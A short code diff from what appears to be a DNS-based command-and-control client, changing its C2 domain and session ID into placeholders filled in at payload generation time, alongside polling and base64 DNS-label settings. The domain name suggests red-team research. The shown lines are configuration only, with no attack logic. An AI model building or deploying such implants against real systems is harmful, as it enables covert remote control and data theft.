@@ -57,9 +57,9 @@ sys.stdout = TeeOutput('c2_client.log')
 sys.stderr = sys.stdout
 
 
-# Configuration
-DNS_DOMAIN = os.environ.get('C2_DOMAIN', 'c2.bt-research-control.com')
-SESSION_ID = 'SESSION_PLACEHOLDER'  # Will be replaced at payload generation time
+# Configuration - These placeholders are replaced at payload generation time
+DNS_DOMAIN = '__C2_DOMAIN_PLACEHOLDER__'
+SESSION_ID = '__SESSION_ID_PLACEHOLDER__'
 POLL_INTERVAL = int(os.environ.get('POLL_INTERVAL', '3'))  # seconds
 MAX_LABEL_LENGTH = 60  # DNS labels max 63 chars; use 60 to be safe with base64 encoding
 DNS_RETRY_ATTEMPTS = 3  # Number of retries for failed DNS queries
